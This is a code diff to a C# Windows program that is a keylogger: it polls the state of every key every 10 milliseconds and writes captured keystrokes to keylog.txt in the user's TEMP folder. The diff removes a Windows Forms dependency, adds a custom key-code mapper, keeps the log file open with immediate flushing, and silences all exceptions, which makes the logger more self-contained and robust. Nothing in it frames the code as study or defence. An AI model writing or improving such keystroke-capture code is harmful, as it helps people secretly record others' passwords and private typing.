@@ -2,7 +2,6 @@ using System;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading;
-using System.Windows.Forms;
 
 class Program
 {
@@ -11,32 +10,57 @@ class Program
 
     static void Main()
     {
-        KeysConverter keyConverter = new KeysConverter();
-        string text = "";
         string path = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "keylog.txt");
 
-        while (true)
+        // Open a single StreamWriter for the duration of the program
+        using (StreamWriter sw = new StreamWriter(path, true))
         {
-            Thread.Sleep(10);
-            for (int i = 0; i < 255; i++)
+            while (true)
             {
-                try
+                Thread.Sleep(10);
+                for (int i = 0; i < 255; i++)
                 {
-                    int key = GetAsyncKeyState(i);
-                    if (key == 1 || key == -32767)
+                    try
                     {
-                        text = keyConverter.ConvertToString(i);
-                        using (StreamWriter sw = File.AppendText(path))
+                        int key = GetAsyncKeyState(i);
+                        if (key == 1 || key == -32767)
                         {
-                            sw.WriteLine(text);
+                            string text = ConvertKeyCodeToString(i);
+                            if (!string.IsNullOrEmpty(text))
+                            {
+                                sw.WriteLine(text);
+                                sw.Flush(); // Ensure data is written immediately
+                            }
                         }
                     }
-                }
-                catch (Exception ex)
-                {
-                    // Optionally log or handle exceptions
+                    catch
+                    {
+                        // Handle exceptions silently to avoid crashing
+                    }
                 }
             }
+        }
+    }
+
+    private static string ConvertKeyCodeToString(int keyCode)
+    {
+        // Map common key codes to their string representations
+        if (keyCode >= 65 && keyCode <= 90) // A-Z
+        {
+            return ((char)keyCode).ToString();
+        }
+        if (keyCode >= 48 && keyCode <= 57) // 0-9
+        {
+            return ((char)keyCode).ToString();
+        }
+        switch (keyCode)
+        {
+            case 32: return "Space";
+            case 13: return "Enter";
+            case 8: return "Backspace";
+            case 9: return "Tab";
+            case 27: return "Escape";
+            default: return null; // Ignore unsupported keys
         }
     }
 }
